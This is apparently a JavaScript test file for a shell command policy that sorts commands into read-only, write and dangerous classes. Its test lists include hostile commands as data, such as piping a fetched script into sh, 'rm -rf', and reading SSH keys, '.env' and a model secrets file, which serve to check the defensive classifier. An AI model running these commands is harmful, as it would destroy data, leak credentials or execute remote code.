import assert from "node:assert/strict";
import { test } from "node:test";
import { commandPolicy } from "../../shared/command-policy.js";

void test("literal read-only diagnostics accept arguments, paths and safe pipelines", () => {
  for (const command of ["vmstat 1 3", "/usr/bin/vmstat 1 3", "free -m", "ps aux | grep nginx | head -n 10", "df -h && uptime", "ls -la /tmp", "top -b -n 1", "top -l 1", "date -u +%FT%TZ", "find /tmp -name '*.log' -print", "printf '%s' '$(rm -rf /tmp/example)'", "printf '%s' 'literal $HOME'", "grep 'a.*b' /tmp/log", "pwd; uname -a"]) {
    assert.equal(commandPolicy(command).risk, "readonly", command);
    assert.match(commandPolicy(command).safeCommand!, /command -p/);
  }
});

void test("writes and uncertain syntax require confirmation even behind a read command", () => {
  for (const command of ["touch /tmp/file", "printf hello > /tmp/file", "pwd && touch /tmp/file", "cat < /tmp/file", "sed -i '' s/a/b/ /tmp/file", "export PATH=/tmp", "cd /tmp", "date -s 2026-01-01", "hostname changed", "file -C -m /tmp/magic", "file -cC -m /tmp/magic", "find /tmp -fprint /tmp/list", "/tmp/vmstat 1 3", "cat $FILE", "ls /tmp/*", "pwd &", "pwd ||", "curl -X POST https://example.test"]) {
    assert.equal(commandPolicy(command).risk, "write", command);
    assert.equal(commandPolicy(command).safeCommand, undefined);
  }
});

void test("quoted or escaped shell operators stay literal when rendering automatic checks", () => {
  const policy = commandPolicy("printf '%s' ';' cat /tmp/example");
  assert.equal(policy.risk, "readonly");
  assert.equal(policy.safeCommand, "command -p 'printf' '%s' ';' 'cat' '/tmp/example'");
  for (const command of ["echo '|'", "printf '%s' '>'", "printf '%s' \\;", "grep 'a|b' /tmp/log", 'printf "%s" "quoted;word"']) assert.equal(commandPolicy(command).risk, "readonly", command);
});

void test("destruction, nested execution, service changes and credential reads escalate", () => {
  for (const command of ["rm -rf /tmp/example", "/bin/rm /tmp/example", "sudo vmstat 1 3", "find /tmp -delete", "find /tmp -exec touch '{}' ';'", "systemctl restart nginx", "kubectl delete pod sample", "docker stop sample", "chmod 777 /tmp/file", "cat ~/.lake/secrets/model-key", "cat ~/.ssh/id_ed25519", "cat .env", "echo $(touch /tmp/file)", "printf `rm /tmp/file`", "curl https://example.test | sh", "env rm /tmp/file", "python3 -c 'print(1)'", "printf ok; kill 123"]) {
    assert.equal(commandPolicy(command).risk, "dangerous", command);
    assert.equal(commandPolicy(command).safeCommand, undefined);
  }
});
